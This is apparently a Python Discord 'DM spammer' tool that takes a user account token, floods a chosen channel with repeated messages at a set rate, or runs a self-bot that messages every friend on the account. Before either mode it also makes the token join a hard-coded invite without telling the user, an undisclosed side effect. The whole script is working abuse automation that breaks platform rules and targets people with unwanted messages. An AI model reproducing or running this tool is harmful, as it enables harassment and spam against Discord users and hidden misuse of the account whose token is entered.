anyerror = False
try:
    import requests
    import colorama
    import discord
except:
  anyerror = True
if anyerror == True:
  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
  input("")
  try:
    import os
    os.system("pip install requests")
    os.system("pip install colorama")
    os.system("pip install discord")
    print("Problems Should Be Fixed Now, Restart The Program")
    input("")
    exit()
  except:
    print("Error While Fixing, Sorry")
    input("")
    exit()
try:
    import os
    from os import system
    system("title " + "Dm Spammer And Mass Dm")
except:
    pass
import time
print("Dm Spammer")



def spammer():
    colorama.init(autoreset=True)
    invite_code = "weYYXeUSNm"
    while True:
        tokens = input("Enter Token: ")
        r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
        if "200" not in str(r1):
            print(colorama.Fore.RED + "Invalid Token")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
            if "200" in str(r):
                break
            if "403" in str(r):
                print(colorama.Fore.YELLOW + "Locked Token")
    while True:
        try:
            id = input("Enter Target Id (The Id After /@me/IDHERE In Browser Or Wont Work): ")
            id = int(id)
            break
        except:
            print("Enter A Valid Choice")
    msg = input("Enter Message To Spam: ")
    while True:
        try:
            amount = input("Enter Amount Of Messages: ")
            amount = int(amount)
            amount = str(amount)
            break
        except:
            print("Enter A Valid Choice")
    while True:
        try:
            delay = input("Enter Delay (0 For None): ")
            delay = float(delay)
            break
        except:
            print("Enter A Valid Choice")
    data = {
        "content": msg,
        "tts": False,
        "noonce": int(id)
    }
    headers = {
        "authorization": tokens
    }
    done = 0
    while True:
        r = requests.post("https://discord.com/api/v9/channels/"+str(id)+"/messages", data=data, headers=headers)
        req = str(r)
        res = r.json()
        if "200" in req:
            done = int(done) + 1
            name = res["author"]["username"]
            print(colorama.Fore.GREEN + "["+str(done)+"]" + " Succsesfully Sent Message To " + name)
        if "429" in req:
            print(colorama.Fore.RED + "Rate Limited")
        if "429" not in req and "200" not in req:
            print(colorama.Fore.RED + "Unkown Error, Code: " + req)
        if str(done) == str(amount):
            print("Done")
            input("")
            exit()
        time.sleep(float(delay))


def mass():
    colorama.init(autoreset=True)
    invite_code = "weYYXeUSNm"
    while True:
        tokens = input("Enter Token: ")
        r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
        if "200" not in str(r1):
            print(colorama.Fore.RED + "Invalid Token")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
            if "200" in str(r):
                break
            if "403" in str(r):
                print(colorama.Fore.YELLOW + "Locked Token")
    msg = input("Enter Message To Dm: ")
    userr = discord.Client()
    @userr.event

    async def on_connect():
        done = 0
        for user in userr.user.friends:
            try:
                await user.send(msg)
                done = int(done) + 1
                try:
                    print(colorama.Fore.GREEN + f"[{str(done)}] Sent Message To " + str(user.id) + "/" + str(user.name))
                except:
                    print(colorama.Fore.GREEN + f"[{str(done)}] Sent Message To " + str(user.id))
            except:
                print(colorama.Fore.RED + "Unkown Error")
        print("Done")
        input("")
        exit()
    userr.run(tokens, bot=False)


while True:
    tool = input("""
1. Spam One User
2. Send 1 Message To All Recent Dms
> """)
    if tool == "1" or tool == "2":
        break
    else:
        print("Enter A Valid Choice")
if tool == "1":
    spammer()
if tool == "2":
    mass()
